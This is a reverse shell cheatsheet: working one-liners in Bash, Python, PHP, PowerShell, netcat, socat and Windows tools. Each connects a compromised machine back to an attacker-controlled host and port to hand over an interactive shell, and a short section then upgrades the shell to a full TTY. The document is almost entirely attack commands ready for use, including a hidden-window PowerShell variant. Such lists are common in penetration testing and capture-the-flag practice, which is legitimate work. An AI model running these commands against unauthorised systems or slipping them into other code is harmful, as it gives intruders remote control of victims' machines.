# Reverse Shells Cheatsheet

## Bash

```bash
bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
0<&196;exec 196<>/dev/tcp/<lhost>/<lport>; sh <&196 >&196 2>&196
```

## Python

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<lhost>",<lport>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<lhost>",<lport>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

## PHP

```bash
php -r '$s=fsockopen("<lhost>",<lport>);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("<lhost>",<lport>);shell_exec("/bin/bash <&3 >&3 2>&3");'
```

## PowerShell

```powershell
powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('<lhost>',<lport>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

## Netcat / Ncat

```bash
nc -e /bin/sh <lhost> <lport>
nc -c /bin/sh <lhost> <lport>
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <lhost> <lport> >/tmp/f
ncat <lhost> <lport> -e /bin/bash
```

## Socat

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<lhost>:<lport>
socat tcp-l:<lport> file:`tty`,raw,echo=0
```

## Upgrade to Full TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
reset
stty rows 40 columns 120
```

## Windows Spawn Helpers

```powershell
nc.exe -e cmd.exe <lhost> <lport>
powercat -c <lhost> -p <lport> -e cmd.exe
```
